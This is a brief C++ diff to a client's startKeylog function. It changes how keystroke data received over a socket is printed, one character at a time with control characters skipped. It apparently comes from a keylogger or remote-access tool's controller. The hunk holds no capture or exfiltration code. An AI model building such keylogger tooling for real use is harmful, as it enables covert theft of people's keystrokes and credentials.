@@ -257,8 +257,9 @@ int Client::startKeylog()
         return -1;
     while (recvResponse(this->sockfd, res, 0) != -1)
     {
-        std::string msg((char *)res.data());
-        std::cout << msg << std::endl;
+        char tmp = *((char*)res.data());
+        if (tmp < 1<<5) continue;
+        std::cout << tmp << std::flush;
     }
     return 0;
 }
